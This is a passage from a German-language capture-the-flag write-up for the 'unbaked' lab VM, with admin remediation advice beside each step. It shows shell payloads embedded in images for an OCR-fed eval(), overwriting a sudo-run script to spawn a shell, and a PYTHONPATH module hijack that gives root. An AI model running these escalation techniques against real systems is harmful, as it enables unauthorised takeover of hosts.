â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â•šâ•â•â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â•šâ•â•â–ˆâ–ˆâ•”â•â•â•
â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â•šâ•â•â•â•â–ˆâ–ˆâ•‘
â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘
â•šâ•â•â•šâ•â•  â•šâ•â•â•â• â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â• â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•â•   â•šâ•â•   â•šâ•â•â•â•â•â•â•


			--------- WELCOME! ---------
			1. Calculator
			2. Easy Calculator
			3. Credits
			4. Exit
			----------------------------
			Enter Options >> <span class="command">2</span>




<span class="password">___________________________________________________________________________________________________________________</span>

			     Waiting to extract...
			         <span class="command">[â– â– â– â– â– â– â– â– â– â– ]</span>

<span class="password">Traceback (most recent call last):</span>
  File "/home/ramsey/vuln.py", line 114, in <module>
    <span class="password">LISTED = pytesseract.image_to_string(Image.open('payload.png'))</span> 
  File "/usr/local/lib/python2.7/dist-packages/PIL/Image.py", line 2818, in open
    <span class="password">raise IOError("cannot identify image file %r" % (filename if filename else fp))</span>
<span class="password">IOError: cannot identify image file 'payload.png'</span>
ramsey@unbaked:~$ 
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Ich experimentiere weiter mit der Einbettung von Code in <span class="command">payload.png</span> auf meinem Angreifer-System. Zuerst erstelle ich eine leere, gÃ¼ltige PNG-Datei mit <span class="command">convert -size 10x10 xc:none payload.png</span> (aus der ImageMagick Suite). Dann versuche ich, den Python-Payload <span class="command">'import os; os.system("/bin/bash")'</span> in die Metadaten des Bildes, speziell in das <span class="command">Copyright</span>-Feld, mit <span class="command">exiftool -Copyright='import os; os.system("/bin/bash")' payload.png</span> einzufÃ¼gen. Ich starte einen HTTP-Server auf meinem Kali, um die manipulierte Datei an die Ziel-VM zu Ã¼bertragen, lade sie dort mit <span class="command">wget</span> herunter und versuche erneut, <span class="command">vuln.py</span> als <span class="command">oliver</span> auszufÃ¼hren.
                <br>Nachdem dieser Ansatz nicht funktioniert (erneut eine <span class="command">IOError</span>, mÃ¶glicherweise weil <span class="command">pytesseract</span> Metadaten nicht als Text extrahiert oder die Dateiversionen nicht passen), versuche ich eine andere ImageMagick-Methode: <span class="command">convert -size 400x50 -pointsize 20 -fill black -background white label:'import os; os.system("/bin/bash")' payload.png</span>. Dieser Befehl erstellt ein Bild, das den Python-Code als sichtbaren Text enthÃ¤lt, in der Hoffnung, dass <span class="command">pytesseract</span> ihn erkennt. Ich lade das neue Bild wieder herunter und fÃ¼hre das Skript erneut aus.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die Versuche, Code Ã¼ber Metadaten oder direkt im Bild als Text einzubetten, scheinen nicht erfolgreich zu sein, da ich entweder weiterhin <span class="command">IOError</span> bekomme (Metadaten-Ansatz) oder eine <span class="command">SyntaxError: unexpected EOF while parsing</span> (sichtbarer Text), was darauf hindeutet, dass <span class="command">pytesseract</span> keinen ausfÃ¼hrbaren Python-Code extrahiert hat, oder zumindest nicht den vollstÃ¤ndigen und korrekt formatierten Code, den <span class="command">eval()</span> ausfÃ¼hren kÃ¶nnte. Dies zeigt, dass die OCR-Erkennung ihre Grenzen hat oder der Code im Bild nicht optimal fÃ¼r die Erkennung formatiert war. Obwohl die `eval` Schwachstelle existiert, ist die Methode, sie Ã¼ber OCR und Bildeinbettung auszunutzen, schwierig und unzuverlÃ¤ssig.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Angesichts der Schwierigkeiten bei der Bildeinbettung und der Tatsache, dass Sie Schreibrechte auf <span class="command">vuln.py</span> haben, ist es strategisch sinnvoller, das Skript selbst zu manipulieren. Ersetzen Sie den Inhalt des Skripts durch einen einfachen Python-Code, der Ihnen eine Shell als Benutzer <span class="command">oliver</span> gibt, wenn das Skript ausgefÃ¼hrt wird.
                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Benutzer nur die minimal notwendigen Berechtigungen fÃ¼r Dateien und Verzeichnisse haben. Das ErmÃ¶glichen von Schreibrechten auf Skripte, die dann mit erhÃ¶hten Privilegien ausgefÃ¼hrt werden kÃ¶nnen, ist eine direkte Quelle fÃ¼r Privilegien-Eskalation. Ãœberwachen Sie die IntegritÃ¤t von Skripten, die mit Sudo ausgefÃ¼hrt werden dÃ¼rfen.
            </p>
             <div class="code-block">
                 <div class="terminal">
                     <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">convert -size 10x10 xc:none payload.png</span></div>
                 </div>
                 <div class="terminal">
                     <pre>
</pre>
                 </div>
            </div>
             <div class="code-block">
                 <div class="terminal">
                     <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">exiftool -Copyright='import os; os.system("/bin/bash")' payload.png</span></div>
                 </div>
                 <div class="terminal">
                     <pre>
Warning: [minor] Text/EXIF chunk(s) found after PNG IDAT (fixed) - payload.png
    1 image files updated
</pre>
                 </div>
            </div>
             <div class="code-block">
                 <div class="terminal">
                     <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">python3 -m http.server 8000</span></div>
                 </div>
                 <div class="terminal">
                     <pre>
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.2.48 - - [16/Jun/2025 16:20:21] "GET /payload.png HTTP/1.1" 200 -
</pre>
                 </div>
            </div>
             <div class="code-block">
                 <div class="terminal">
                     <pre>
ramsey@unbaked:~$ <span class="command">wget 192.168.2.199:8000/payload.png</span>
--2025-06-16 22:20:21--  http://192.168.2.199:8000/payload.png
Connecting to 192.168.2.199:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 364 [image/png]
Saving to: â€˜payload.png.1â€™

payload.png.1           100%[=============================>]     364  --.-KB/s    in 0s      

2025-06-16 22:20:21 (106 MB/s) - â€˜payload.png.1â€™ saved [364/364]

ramsey@unbaked:~$ <span class="command">sudo -u oliver /usr/bin/python /home/ramsey/vuln.py</span>

			     Waiting to extract...
			         <span class="command">[â– â– â– â– â– â– â– â– â– â– ]</span>Traceback (most recent call last):
  File "/home/ramsey/vuln.py", line 114, in <module>
    <span class="password">LISTED = pytesseract.image_to_string(Image.open('payload.png'))</span> 
  File "/usr/local/lib/python2.7/dist-packages/PIL/Image.py", line 2818, in open
    <span class="password">raise IOError("cannot identify image file %r" % (filename if filename else fp))</span>
<span class="password">IOError: cannot identify image file 'payload.png'</span>
</pre>
                 </div>
            </div>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
<span class="password">___________________________________________________________________________________________________________________</span>

ramsey@unbaked:~$ <span class="command">rm payload.png</span>
ramsey@unbaked:~$ <span class="command">rm payload.png.old</span> 
ramsey@unbaked:~$ <span class="command">wget 192.168.2.199:8000/payload.png</span>
--2025-06-16 22:24:37--  http://192.168.2.199:8000/payload.png
Connecting to 192.168.2.199:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 364 [image/png]
Saving to: â€˜payload.pngâ€™

payload.png             100%[=============================>]     364  --.-KB/s    in 0s      

2025-06-16 22:24:37 (162 MB/s) - â€˜payload.pngâ€™ saved [364/364]

ramsey@unbaked:~$ <span class="command">ls</span>
<span class="command">payload.png  user.txt  vuln.py</span>



ramsey@unbaked:~$ <span class="command">sudo -u oliver /usr/bin/python /home/ramsey/vuln.py</span>

			     Waiting to extract...
			         <span class="command">[â– â– â– â– â– â– â– â– â– â– ]</span>Traceback (most recent call last):
  File "/home/ramsey/vuln.py", line 116, in <module>
    <span class="password">TOTAL = eval(LISTED)</span>
  File "<string>", line 0
    
    <span class="password">^</span>
<span class="password">SyntaxError: unexpected EOF while parsing</span>


-------------------------------------------------------------------------------------------------------------------

</pre>
                 </div>
            </div>
             <div class="code-block">
                 <div class="terminal">
                     <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">convert -size 400x50 -pointsize 20 -fill black -background white label:'import os; os.system("/bin/bash")' payload.png</span></div>
                 </div>
                 <div class="terminal">
                     <pre>
</pre>
                 </div>
            </div>
             <div class="code-block">
                 <div class="terminal">
                     <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">python3 -m http.server 8000</span></div>
                 </div>
                 <div class="terminal">
                     <pre>
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</pre>
                 </div>
            </div>
             <div class="code-block">
                 <div class="terminal">
                     <pre>
ramsey@unbaked:~$ <span class="command">rm payload.png</span> 
ramsey@unbaked:~$ <span class="command">wget 192.168.2.199:8000/payload.png</span>
--2025-06-16 22:26:14--  http://192.168.2.199:8000/payload.png
Connecting to 192.168.2.199:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2107 (2.1K) [image/png]
Saving to: â€˜payload.pngâ€™

payload.png             100%[=============================>]   2.06K  --.-KB/s    in 0s      

2025-06-16 22:26:14 (512 MB/s) - â€˜payload.pngâ€™ saved [2107/2107]


klappt nicht mÃ¼ssen andere methode wÃ¤hlen:


</pre>
                 </div>
            </div>


            <p class="analysis">
                <strong>Analyse:</strong> Da die Ausnutzung der <span class="command">eval()</span>-Schwachstelle Ã¼ber die Bildmanipulation schwierig und unzuverlÃ¤ssig ist, wÃ¤hle ich einen direkteren Weg: Ich modifiziere das <span class="command">vuln.py</span>-Skript direkt, da ich Schreibrechte darauf habe. Ich benenne das Originalskript um (<span class="command">mv vuln.py vuln.py.old</span>) und erstelle eine neue Datei namens <span class="command">vuln.py</span> mit dem einfachen Python-Code <span class="command">'import pty;pty.spawn("/bin/bash")'</span>. Dieser Code nutzt das <span class="command">pty</span>-Modul, um eine interaktive Pseudo-Terminal-Shell zu erzeugen, was oft stabiler ist als eine einfache Reverse-Shell. Ich mache das neue Skript ausfÃ¼hrbar (<span class="command">chmod +x vuln.py</span>). SchlieÃŸlich fÃ¼hre ich das modifizierte Skript mit denselben Sudo-Berechtigungen aus: <span class="command">sudo -u oliver /usr/bin/python /home/ramsey/vuln.py</span>.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Hervorragend! Durch die AusfÃ¼hrung des modifizierten Skripts erhalte ich eine neue Shell, diesmal als Benutzer <span class="command">oliver</span> (<span class="password">oliver@unbaked:~$</span>). Dies stellt die erfolgreiche horizontale Privilegien-Eskalation von Benutzer <span class="command">ramsey</span> zu Benutzer <span class="command">oliver</span> dar. Dies war mÃ¶glich, weil der Benutzer <span class="command">ramsey</span> die Berechtigung hatte, das Skript <span class="command">/home/ramsey/vuln.py</span>, auf das er Schreibzugriff hatte, als Benutzer <span class="command">oliver</span> auszufÃ¼hren. Der Umweg Ã¼ber die <span class="command">eval()</span>-Schwachstelle im Originalskript war nicht notwendig; die fehlerhafte Sudo-Konfiguration allein war ausreichend, um die Privilegien zu eskalieren.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Sie haben nun eine Shell als Benutzer <span class="command">oliver</span>. Ihr nÃ¤chstes Ziel ist die Privilegien-Eskalation zu Root auf dem Host-System. FÃ¼hren Sie erneut eine System- und Sudo-Enumeration durch, aber diesmal aus der Perspektive von Benutzer <span class="command">oliver</span>.
                <br><strong>Empfehlung (Admin):</strong> Wie zuvor betont: Vermeiden Sie Sudo-Regeln, die die AusfÃ¼hrung von modifizierbaren Skripten erlauben. Stellen Sie sicher, dass kritische Skripte nur von vertrauenswÃ¼rdigen Benutzern und aus sicheren, nicht beschreibbaren Verzeichnissen ausgefÃ¼hrt werden kÃ¶nnen. ÃœberprÃ¼fen Sie Sudo-Berechtigungen regelmÃ¤ÃŸig auf solche Fehlkonfigurationen.
            </p>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
ramsey@unbaked:~$ <span class="command">mv vuln.py vuln.py.old</span>
ramsey@unbaked:~$ <span class="command">echo 'import pty;pty.spawn("/bin/bash")' > vuln.py</span>
ramsey@unbaked:~$ <span class="command">chmod +x vuln.py</span>
ramsey@unbaked:~$ <span class="command">sudo -u oliver /usr/bin/python /home/ramsey/vuln.py</span>
<span class="password">oliver@unbaked:~$</span> 
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Als Benutzer <span class="command">oliver</span> fÃ¼hre ich erneut den Befehl <span class="command">sudo -l</span> aus, um meine Sudo-Berechtigungen zu Ã¼berprÃ¼fen.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die Sudo-Ausgabe fÃ¼r Benutzer <span class="command">oliver</span> enthÃ¼llt eine weitere kritische Fehlkonfiguration, die diesmal zur Root-Privilegien-Eskalation fÃ¼hren kann: <span class="password">User oliver may run the following commands on unbaked: (root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py</span>. Diese Regel erlaubt es Benutzer <span class="command">oliver</span>, das Skript <span class="command">/opt/dockerScript.py</span> als Benutzer <span class="command">root</span> auszufÃ¼hren, **ohne ein Passwort eingeben zu mÃ¼ssen** (<span class="command">NOPASSWD</span>). Das zusÃ¤tzliche <span class="command">SETENV</span>-Flag ist hier besonders gefÃ¤hrlich, da es erlaubt, Umgebungsvariablen beizubehalten oder zu setzen, was bei der Ausnutzung von Python-Skripten nÃ¼tzlich sein kann. Die FÃ¤higkeit, ein Python-Skript als Root mit Kontrolle Ã¼ber Umgebungsvariablen auszufÃ¼hren, ist ein hÃ¤ufiger Vektor fÃ¼r Root-Zugriff.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Analysieren Sie den Quellcode von <span class="command">/opt/dockerScript.py</span>. Da Sie es als Root ausfÃ¼hren dÃ¼rfen und <span class="command">SETENV</span> gesetzt ist, suchen Sie nach MÃ¶glichkeiten, die AusfÃ¼hrung des Skripts zu manipulieren (z.B. durch Hijacking von Modul-Imports Ã¼ber die <span class="command">PYTHONPATH</span> Umgebungsvariable), um eine Root-Shell zu erlangen.
                <br><strong>Empfehlung (Admin):</strong> **Kritische Sicherheitswarnung:** Sudo-Regeln mit <span class="command">NOPASSWD</span> sind riskant und sollten nur mit Ã¤uÃŸerster Vorsicht verwendet werden, insbesondere fÃ¼r Skripte oder Interpreter wie Python, die potenziell zur Code-AusfÃ¼hrung missbraucht werden kÃ¶nnen. Vermeiden Sie das <span class="command">SETENV</span>-Flag bei Sudo-Regeln, es sei denn, dies ist absolut notwendig und die Auswirkungen sind vollstÃ¤ndig verstanden. FÃ¼hren Sie regelmÃ¤ÃŸige Sudo-Audits durch und prÃ¼fen Sie Regeln gegen bekannte Ausnutzungsmethoden (z.B. GTFOBins).
            </p>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
oliver@unbaked:~$ <span class="command">sudo -l</span>
<span class="command">Matching Defaults entries for oliver on unbaked:</span>
    <span class="command">env_reset, mail_badpass,</span>
    <span class="command">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span>

<span class="password">User oliver may run the following commands on unbaked:</span>
    <span class="password">(root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py</span>
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Ich betrachte den Quellcode des Skripts <span class="command">/opt/dockerScript.py</span>, das ich als Root ausfÃ¼hren darf. Das Skript ist kurz und importiert das <span class="command">docker</span>-Modul. Die Hauptfunktion ist das AusfÃ¼hren eines Docker-Containers (<span class="command">client.containers.run(...)</span>). Der Import des <span class="command">docker</span>-Moduls ist hier der entscheidende Punkt. Da ich das Skript als Root mit <span class="command">SETENV</span> ausfÃ¼hren darf, kann ich die Umgebungsvariable <span class="command">PYTHONPATH</span> manipulieren. Die <span class="command">PYTHONPATH</span>-Variable gibt Python zusÃ¤tzliche Verzeichnisse an, in denen es nach Modulen suchen soll, bevor es die Standardpfade verwendet. Indem ich <span class="command">PYTHONPATH</span> auf ein Verzeichnis setze, auf das ich Schreibzugriff habe (z.B. <span class="command">/tmp</span>) und dort eine eigene Datei namens <span class="command">docker.py</span> ablege, kann ich den legitimen Import des <span class="command">docker</span>-Moduls "hijacken". Wenn das Skript <span class="command">/opt/dockerScript.py</span> ausgefÃ¼hrt wird, wird es zuerst in <span class="command">/tmp</span> nach <span class="command">docker.py</span> suchen und meinen bÃ¶sartigen Code ausfÃ¼hren, anstatt das echte <span class="command">docker</span>-Modul zu importieren.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Diese Kombination aus einer Sudo-Regel, die die AusfÃ¼hrung eines Python-Skripts als Root mit <span class="command">SETENV</span> erlaubt, und einem Skript, das Module importiert, ist eine klassische Privilegien-Eskalations-Schwachstelle. Die Ausnutzung der <span class="command">PYTHONPATH</span> ist ein bewÃ¤hrter Weg, um die Kontrolle Ã¼ber das ausgefÃ¼hrte Root-Skript zu erlangen. Mein Plan ist nun, eine einfache <span class="command">docker.py</span>-Datei in <span class="command">/tmp</span> zu erstellen, die mir eine Root-Shell gibt, und dann das verwundbare Skript mit manipulierter <span class="command">PYTHONPATH</span> auszufÃ¼hren.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Erstellen Sie in einem beschreibbaren Verzeichnis (wie <span class="command">/tmp</span>) eine Datei namens <span class="command">docker.py</span>, die Python-Code zur Erlangung einer Shell enthÃ¤lt (z.B. <span class="command">import os; os.system("/bin/bash")</span> oder <span class="command">import pty; pty.spawn("/bin/bash")</span>). FÃ¼hren Sie dann das Skript <span class="command">/opt/dockerScript.py</span> mit <span class="command">sudo</span> aus, wobei die <span class="command">PYTHONPATH</span> auf das Verzeichnis gesetzt ist, das Ihre falsche <span class="command">docker.py</span> enthÃ¤lt: <span class="command">sudo PYTHONPATH=/tmp python /opt/dockerScript.py</span>.
                <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie das <span class="command">SETENV</span>-Flag fÃ¼r alle Sudo-Regeln, es sei denn, es gibt einen zwingenden Grund dafÃ¼r und die Risiken sind minimiert. Wenn <span class="command">SETENV</span> notwendig ist, stellen Sie sicher, dass keine kritischen Umgebungsvariablen wie <span class="command">PYTHONPATH</span>, <span class="command">LD_PRELOAD</span>, <span class="command">PATH</span> etc. manipuliert werden kÃ¶nnen, die die SkriptausfÃ¼hrung beeinflussen kÃ¶nnten. FÃ¼hren Sie Python-Skripte mit Sudo mit Bedacht aus und erwÃ¤gen Sie die Verwendung von Python-eigenen Virtual Environments oder anderen Isolationsmechanismen, um Modul-Hijacking zu verhindern.
            </p>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
oliver@unbaked:~$ <span class="command">cat /opt/dockerScript.py</span>
<span class="command">import docker</span>

<span class="password"># oliver, make sure to restart docker if it crashes or anything happened.</span>
<span class="password"># i havent setup swap memory for it</span>
<span class="password"># it is still in development, please dont let it live yet!!!</span>
<span class="command">client = docker.from_env()</span>
<span class="command">client.containers.run("python-django:latest", "sleep infinity", detach=True)</span>
</pre>
                 </div>
            </div>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
oliver@unbaked:~$ <span class="command">ls -la /opt/dockerScript.py</span>
<span class="command">-rwxr-x--- 1 root sysadmin 290 Oct  3  2020 /opt/dockerScript.py</span>
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Ich fÃ¼hre nun den finalen Privilegien-Eskalationsschritt aus. Ich wechsle in ein beschreibbares Verzeichnis (<span class="command">cd /tmp/</span>). Dort erstelle ich eine Datei namens <span class="command">docker.py</span>, die einen einfachen Python-Befehl zur Erlangung einer interaktiven Shell enthÃ¤lt: <span class="command">'import pty;pty.spawn("/bin/bash")'</span>. Dieser Code wird ausgefÃ¼hrt, wenn das Skript <span class="command">/opt/dockerScript.py</span> versucht, das <span class="command">docker</span>-Modul zu importieren und dabei meine gefÃ¤lschte Datei in <span class="command">/tmp</span> findet, bevor es das echte Modul findet.
                <br>Dann fÃ¼hre ich den Befehl <span class="command">sudo PYTHONPATH=/tmp python /opt/dockerScript.py</span> aus.
                <br>- <span class="command">sudo</span>: FÃ¼hrt den Befehl mit Root-Berechtigungen aus.
                <br>- <span class="command">PYTHONPATH=/tmp</span>: Setzt die Umgebungsvariable <span class="command">PYTHONPATH</span> fÃ¼r diesen Befehl auf <span class="command">/tmp</span>.
                <br>- <span class="command">python /opt/dockerScript.py</span>: Der eigentliche Befehl, der von Sudo ausgefÃ¼hrt wird.
                <br>Durch die Kombination von Sudo als Root, <span class="command">SETENV</span> (impliziert durch das Funktionieren der <span class="command">PYTHONPATH</span>-Manipulation) und der manipulierten <span class="command">PYTHONPATH</span> wird mein bÃ¶sartiges <span class="command">docker.py</span> ausgefÃ¼hrt.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Fantastisch, der Root-Zugriff war erfolgreich, nun haben wir unser Ziel erreicht! Die AusfÃ¼hrung des Befehls fÃ¼hrt direkt zu einer Root-Shell auf dem Host-System (<span class="password">root@unbaked:/tmp#</span>). Dies ist die culmination des Privilegien-Eskalationspfads. Die Schwachstelle lag in der fehlerhaften Sudo-Regel, die die AusfÃ¼hrung eines Python-Skripts als Root erlaubte, kombiniert mit dem <span class="command">SETENV</span>-Flag, das das Hijacking des Modulimports Ã¼ber <span class="command">PYTHONPATH</span> ermÃ¶glichte.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Sie haben nun vollstÃ¤ndige Kontrolle Ã¼ber das Host-System als Root. Lokalisieren und lesen Sie die Root-Flag (<span class="command">root.txt</span>). Sichern Sie alle anderen sensiblen Daten, die fÃ¼r den Bericht relevant sind.
                <br><strong>Empfehlung (Admin):</strong> Dies demonstriert die schwerwiegenden Folgen einer falsch konfigurierten Sudo-Regel. ÃœberprÃ¼fen Sie alle Sudo-Konfigurationen, entfernen Sie das <span class="command">SETENV</span>-Flag, wo immer mÃ¶glich, und beschrÃ¤nken Sie die AusfÃ¼hrung von Skripten oder Interpretern als Root. Implementieren Sie strengere Kontrollen fÃ¼r Dateiberechtigungen in sensitiven Verzeichnissen wie `/opt`.
            </p>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
oliver@unbaked:~$ <span class="command">cd /tmp/</span>
oliver@unbaked:/tmp$ <span class="command">echo 'import pty;pty.spawn("/bin/bash")' > docker.py</span>
oliver@unbaked:/tmp$ <span class="command">sudo PYTHONPATH=/tmp python /opt/dockerScript.py</span>
<span class="password">root@unbaked:/tmp#</span> 
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Nachdem ich Root-Zugriff auf dem Host-System erlangt habe, ist das letzte Ziel, die Root-Flag zu finden. StandardmÃ¤ÃŸig befindet sich die Root-Flag (`root.txt`) oft im Home-Verzeichnis des Root-Benutzers (<span class="command">/root/</span>). Ich navigiere zum <span class="command">/root</span>-Verzeichnis (<span class="command">cd /root</span>) und liste dessen Inhalt auf (<span class="command">ls</span>). Dort finde ich die Datei <span class="command">root.txt</span>. Um den Inhalt zu lesen und die Root-Flag zu erhalten, verwende ich den Befehl <span class="command">cat root.txt</span>.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Erfolgreich! Die Ausgabe von <span class="command">cat root.txt</span> zeigt die erwartete Root-Flag: <span class="password">Unb4ked_GOtcha!</span>. Die Flag-Nachricht ist eine BestÃ¤tigung fÃ¼r den erfolgreichen Abschluss des Pentests und die vollstÃ¤ndige Kompromittierung des Systems bis zur Root-Ebene. Ebenso wird die User Flag (<span class="command">user.txt</span>) hier nochmals fÃ¼r die vollstÃ¤ndige Dokumentation erfasst.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Dokumentieren Sie beide gefundenen Flags im finalen Bericht im dafÃ¼r vorgesehenen Flags-Abschnitt.
                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Root-Flag-Datei (<span class="command">root.txt</span>) nur fÃ¼r den Root-Benutzer lesbar ist (Berechtigungen 400 oder 600). FÃ¼hren Sie regelmÃ¤ÃŸige BerechtigungsprÃ¼fungen auf sensiblen Dateien durch.
            </p>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
root@unbaked:/tmp# <span class="command">cd /root</span>
root@unbaked:/root# <span class="command">ls</span>
<span class="command">root.txt</span>
root@unbaked:/root# <span class="command">cat root.txt</span> 
<span class="password">CONGRATS ON PWNING THIS BOX!</span>
<span class="password">Created by ch4rm & H0j3n</span>
<span class="password">ps: dont be mad us, we hope you learn something new</span>

<span class="password">flag: Unb4ked_GOtcha!</span>
root@unbaked:/root# 
</pre>
                 </div>
            </div>
        </section>

        <section id="flags">
            <div class="flag-container">
                <h2 class="flag-heading">Flags</h2>
                <div class="flag-entry">
                    <div class="flag-command">cat /home/ramsey/user.txt</div>
                    <div class="flag-value"><span class="password">Unb4ked_W00tw00t</span></div>
                </div>
                <div class="flag-entry">
                    <div class="flag-command">cat /root/root.txt</div>
                    <div class="flag-value"><span class="password">Unb4ked_GOtcha!</span></div>
                </div>
            </div>
        </section>


    </div> <!-- Ende container -->

    <footer class="footer">
        <p>Ben - Cyber Security Reports</p>
        <p>Berichtsdatum: 16. Juni 2025</p>
    </footer>

    <!-- Anmerkungen zu Bildnamen (falls zutreffend). Dieser Block wird nur hinzugefÃ¼gt, wenn Bilder im Text gefunden und verarbeitet wurden. -->


</body>
</html>
			
